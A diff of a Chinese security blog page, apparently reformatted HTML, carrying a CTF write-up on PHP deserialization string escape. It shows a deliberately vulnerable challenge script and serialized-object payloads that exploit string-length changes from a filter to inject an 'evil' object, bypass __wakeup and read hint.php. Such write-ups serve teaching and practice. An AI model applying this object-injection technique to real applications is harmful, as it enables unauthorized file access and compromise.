@@ -1,243 +1,104 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>PHP 反序列化与字符串逃逸 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>PHP 反序列化与字符串逃逸</h1>
-      
-<div class="post-meta">
-    <time>2021-07-18</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>)
-</div>
-
-      <div><h3 id="0x00-漏洞成因">0x00 漏洞成因</h3>
-<p>该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后</p>
-<h3 id="0x01-条件">0x01 条件</h3>
-<ul>
-<li>相邻两个属性的值是我们可以控制的</li>
-<li>前一个属性的 s 长度可以发生变化（变长变短都可以）
-<ul>
-<li>若变长则可以直接在该属性中注入对象来达到反序列化</li>
-<li>若变短则可以吞掉后面相邻属性的值，在后面的属性中注入新的对象</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x02-题目">0x02 题目</h3>
-<p>Bugku CTF 的题</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// php版本:5.4.44
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-type: text/html; charset=utf-8&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// highlight_file(__FILE__);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">evil</span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($hint){
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">=</span> $hint;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct(){
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span><span style="color:#f92672">===</span><span style="color:#e6db74">&#34;hint.php&#34;</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">@</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span>)); 
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">var_dump</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __wakeup() { 
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;╭(●｀∀´●)╯&#34;</span>) { 
-</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//There&#39;s a hint in ./hint.php
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;╰(●’◡’●)╮&#34;</span>; 
-</span></span><span style="display:flex;"><span>        } 
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $username;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $password;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($username, $password){
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> $username;
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> $password;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filter</span>($data){
-</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;123&#39;</span>, <span style="color:#e6db74">&#39;abcdef&#39;</span>, $data);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $data;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
-</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>($username, $password));
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/flag/is&#39;</span>, $a))
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;NoNoNo!&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$w <span style="color:#f92672">=</span> <span style="color:#a6e22e">filter</span>($a);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($w);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><h3 id="0x03-分析">0x03 分析</h3>
-<ul>
-<li>可以看到我们可以传入 username 和 password 触发 User 类，而我们需要触发 evil 类从而获取 hint.php</li>
-<li>题目中序列化了 User 类然后结果被方法 write 和 read 处理后再反序列化</li>
-<li>filter 一个是将序列化后的字符串变长的函数</li>
-<li>我们可以序列化 eval 类并作为参数传入 User，将 eval 当作 User 的一个元素从而触发 eval</li>
-</ul>
-<h3 id="0x04-获取触发-evil-的序列化字符串">0x04 获取触发 evil 的序列化字符串</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">evil</span>{
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $hint;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($hint){
-</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hint</span> <span style="color:#f92672">=</span> $hint;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">evil</span>(<span style="color:#e6db74">&#34;hint.php&#34;</span>)));
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>输出 <code>payload：O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}</code></p>
-<h3 id="0x05-利用过滤后变长">0x05 利用(过滤后变长)</h3>
-<p>经过 filter 函数后，序列化的字符串中的 123 会被替换为 abcdef，整体来说遇到一个 123 字符串就会变长 3</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>($username, $password));
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/flag/is&#39;</span>, $a))
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;NoNoNo!&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>($a);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$w <span style="color:#f92672">=</span> <span style="color:#a6e22e">filter</span>($a);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">var_dump</span>($w);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;br&gt;&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">unserialize</span>($w);
-</span></span></code></pre></div><p>post username=111&amp;password=222，经过 filter 后输出</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;111&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;password&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;222&#34;</span>;}
-</span></span></code></pre></div><p>可以看出其实可控的是 111 及后面的 222，我们需要将 User 类序列化的字符串想办法构造为</p>
-<p><code>O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:4:&quot;111&quot;;     s:8:&quot;password&quot;;</code><f>序列化后的 evil 字符串</f>;}</p>
-<p>当我们传入构造后的序列化 payload 后
-<img src="/img/post/16258097627342.jpg" alt=""></p>
-<p>上图中，位置 2 在序列化的字符串中其实是 username 的值，是一个字符串，若我们在 1 的位置插入 60 个字符</p>
-<p>则 username 的值为我们插入的 60 个字符，而 password 的值则为 payload <f><code>O:4:&quot;evil&quot;:1:{s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;}</code></f>，后面 3 位置的字符串失效，当反序列化时即可触发 evil，构造后如下图：
-<img src="/img/post/16258101773735.jpg" alt="">
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>PHP 反序列化与字符串逃逸 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>PHP 反序列化与字符串逃逸</h1><div class=post-meta><time>2021-07-18</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>)</div><div><h3 id=0x00-漏洞成因>0x00 漏洞成因</h3><p>该漏洞主要是因为序列化的字符串在经过过滤函数不正确的处理而导致对象注入，目前看到都是因为过滤函数放在了 serialize 函数之后</p><h3 id=0x01-条件>0x01 条件</h3><ul><li>相邻两个属性的值是我们可以控制的</li><li>前一个属性的 s 长度可以发生变化（变长变短都可以）<ul><li>若变长则可以直接在该属性中注入对象来达到反序列化</li><li>若变短则可以吞掉后面相邻属性的值，在后面的属性中注入新的对象</li></ul></li></ul><h3 id=0x02-题目>0x02 题目</h3><p>Bugku CTF 的题</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// php版本:5.4.44
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-type: text/html; charset=utf-8&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e>// highlight_file(__FILE__);
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>evil</span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $hint;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($hint){
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span> <span style=color:#f92672>=</span> $hint;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __destruct(){
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span><span style=color:#f92672>===</span><span style=color:#e6db74>&#34;hint.php&#34;</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#f92672>@</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span>)); 
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>var_dump</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __wakeup() { 
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;╭(●｀∀´●)╯&#34;</span>) { 
+</span></span><span style=display:flex><span>            <span style=color:#75715e>//There&#39;s a hint in ./hint.php
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;╰(●’◡’●)╮&#34;</span>; 
+</span></span><span style=display:flex><span>        } 
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>User</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $username;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $password;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($username, $password){
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> $username;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> $password;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($data){
+</span></span><span style=display:flex><span>    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;123&#39;</span>, <span style=color:#e6db74>&#39;abcdef&#39;</span>, $data);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $data;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
+</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;password&#39;</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>($username, $password));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/flag/is&#39;</span>, $a))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;NoNoNo!&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$w <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>($a);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>unserialize</span>($w);
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><h3 id=0x03-分析>0x03 分析</h3><ul><li>可以看到我们可以传入 username 和 password 触发 User 类，而我们需要触发 evil 类从而获取 hint.php</li><li>题目中序列化了 User 类然后结果被方法 write 和 read 处理后再反序列化</li><li>filter 一个是将序列化后的字符串变长的函数</li><li>我们可以序列化 eval 类并作为参数传入 User，将 eval 当作 User 的一个元素从而触发 eval</li></ul><h3 id=0x04-获取触发-evil-的序列化字符串>0x04 获取触发 evil 的序列化字符串</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>evil</span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $hint;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($hint){
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>hint</span> <span style=color:#f92672>=</span> $hint;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>evil</span>(<span style=color:#e6db74>&#34;hint.php&#34;</span>)));
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><p>输出 <code>payload：O:4:"evil":1:{s:4:"hint";s:8:"hint.php";}</code></p><h3 id=0x05-利用过滤后变长>0x05 利用(过滤后变长)</h3><p>经过 filter 函数后，序列化的字符串中的 123 会被替换为 abcdef，整体来说遇到一个 123 字符串就会变长 3</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$a <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>User</span>($username, $password));
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/flag/is&#39;</span>, $a))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;NoNoNo!&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>($a);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$w <span style=color:#f92672>=</span> <span style=color:#a6e22e>filter</span>($a);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>($w);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>unserialize</span>($w);
+</span></span></code></pre></div><p>post username=111&amp;password=222，经过 filter 后输出</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>O</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;User&#34;</span><span style=color:#f92672>:</span><span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>{<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>8</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;username&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;111&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>8</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;password&#34;</span>;<span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#ae81ff>3</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;222&#34;</span>;}
+</span></span></code></pre></div><p>可以看出其实可控的是 111 及后面的 222，我们需要将 User 类序列化的字符串想办法构造为</p><p><code>O:4:"User":2:{s:8:"username";s:4:"111"; s:8:"password";</code><f>序列化后的 evil 字符串</f>;}</p><p>当我们传入构造后的序列化 payload 后
+<img src=/img/post/16258097627342.jpg alt></p><p>上图中，位置 2 在序列化的字符串中其实是 username 的值，是一个字符串，若我们在 1 的位置插入 60 个字符</p><p>则 username 的值为我们插入的 60 个字符，而 password 的值则为 payload <f><code>O:4:"evil":1:{s:4:"hint";s:8:"hint.php";}</code></f>，后面 3 位置的字符串失效，当反序列化时即可触发 evil，构造后如下图：
+<img src=/img/post/16258101773735.jpg alt>
 将 payload 中 evil 的属性个数改为大于存在的属性个数即可绕过 wakeup，最终得到 hint.php 的内容
-<img src="/img/post/16258103107382.jpg" alt=""></p>
-<h3 id="0x06-延伸过滤后变短">0x06 延伸(过滤后变短)</h3>
-<p>更改 filter 函数，经过处理后序列号字符串变短</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">filter</span>($data){
-</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;abcdef&#39;</span>, <span style="color:#e6db74">&#39;123&#39;</span>, $data);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $data;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>若处理后变短则可以吞掉后面相邻属性的值，所以可以在后面的属性中注入新的对象</p>
-<p>前面的属性经过处理后变短，需要我们填充垃圾字符串，使长度和原来相同，就会注入 evil 对象即可
-<img src="/img/post/16258114498309.jpg" alt=""></p>
-<p>从上图可以看出，输入的字符串被替换为了 123123，但是显示的长度还是 12，位数不对时反序列化就会出错</p>
-<p>我们需要把位置 1 的数字和位置 2 的字符串的位数设置为相同，这样反序列化不会出错且位置 3 还会触发 evil</p>
-<p>具体如下，可触发 evil 得到 hint.php 中的内容：
-<img src="/img/post/16258119470950.jpg" alt=""></p>
-<h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="https://blog.csdn.net/qq_25755011/article/details/115950424?_blank">https://blog.csdn.net/qq_25755011/article/details/115950424</a></li>
-<li><a href="https://www.cnblogs.com/tr1ple/p/11876441.html?_blank">https://www.cnblogs.com/tr1ple/p/11876441.html</a></li>
-<li><a href="https://cloud.tencent.com/developer/article/1627299?_blank">https://cloud.tencent.com/developer/article/1627299</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+<img src=/img/post/16258103107382.jpg alt></p><h3 id=0x06-延伸过滤后变短>0x06 延伸(过滤后变短)</h3><p>更改 filter 函数，经过处理后序列号字符串变短</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($data){
+</span></span><span style=display:flex><span>    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;abcdef&#39;</span>, <span style=color:#e6db74>&#39;123&#39;</span>, $data);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $data;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>若处理后变短则可以吞掉后面相邻属性的值，所以可以在后面的属性中注入新的对象</p><p>前面的属性经过处理后变短，需要我们填充垃圾字符串，使长度和原来相同，就会注入 evil 对象即可
